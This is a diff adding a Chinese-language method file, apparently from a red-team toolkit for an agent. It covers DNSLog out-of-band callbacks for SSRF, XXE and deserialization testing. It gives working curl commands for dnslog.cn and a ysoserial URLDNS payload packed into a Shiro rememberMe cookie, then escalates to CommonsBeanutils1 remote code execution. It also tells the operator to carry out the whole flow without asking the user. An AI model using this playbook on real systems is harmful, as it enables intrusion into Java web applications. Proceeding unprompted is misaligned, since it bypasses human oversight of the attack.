@@ -1,0 +1,40 @@
+---
+
+phase: webapp
+vuln_class: [oob, dnslog]
+title: DNSLog OOB 外带回连
+summary: 需要外带验证回连的口（SSRF/XXE/反序列化/Shiro key）默认方法。
+---
+
+# DNSLog OOB 外带回连（默认方法 · 不询问）
+
+> 职责：需要外带验证回连的口（Shiro rememberMe key 验证、SSRF/XXE/反序列化 OOB、盲打外带）统一走本方法。
+> **默认用 dnslog.cn，自己操作全流程，不主动问用户要域名/平台。**（2026-09-07 用户指令）
+
+## 平台与方法
+
+- 平台：`http://www.dnslog.cn`（国内站，**必须 `--noproxy '*'`，别走代理**）
+- 每次鉴权用同一 curl cookie 会话，跨两步保持一致：
+  - 建会话+取子域：
+    ```bash
+    curl --noproxy '*' -c /tmp/dnslog_cookie.txt "http://www.dnslog.cn/"
+    curl --noproxy '*' -b /tmp/dnslog_cookie.txt "http://www.dnslog.cn/getdomain.php"  # → xxxx.dnslog.cn
+    ```
+  - 拉记录：
+    ```bash
+    curl --noproxy '*' -b /tmp/dnslog_cookie.txt "http://www.dnslog.cn/getrecords.php"  # JSON 数组
+    ```
+- **时序**：请求命中目标后 DNS 递归有延迟，发完等 20s 再拉；无记录先排查 dnslog 平台记录能力（本地对子域 nslookup），再判目标没回连。
+- **判读**：URLDNS 用对 key，目标会向子域发真实 DNS 查询并留记录；零回连 = key 不对 / 反序列化路径不可达 → 按 `vuln-report-format` 认钥闸**不落账**。
+
+## 落地场景：Shiro rememberMe key 验证
+
+1. 先确认框架/rememberMe 开启：登出响应 `Set-Cookie: rememberMe=deleteMe`。
+2. 生成本地 URLDNS payload（只一次 DNS 回连、不落地命令）：
+   ```bash
+   java --add-opens java.base/java.net=ALL-UNNAMED -jar "D:/RedTeamTool/ysoserial-all/ysoserial-all.jar" URLDNS "http://<子域>"
+   ```
+   **Java 22 必须加 `--add-opens java.base/java.net=ALL-UNNAMED`**，否则 `InaccessibleObjectException`（ysoserial 反射 URL.hashCode 被模块锁）。
+3. base64 后装进 `rememberMe` cookie，POST `/login`（正常登录载荷 + 完整浏览器头）。
+4. 对照：同一步里用一个明文垃圾 base64 串当基线，看后端返回是否一致；真正的判别在 dnslog 有无记录，不是 code。
+5. key 有效才接 `CommonsBeanutils1` 打 RCE（仍只用最小证据）；没回连不编 RCE。
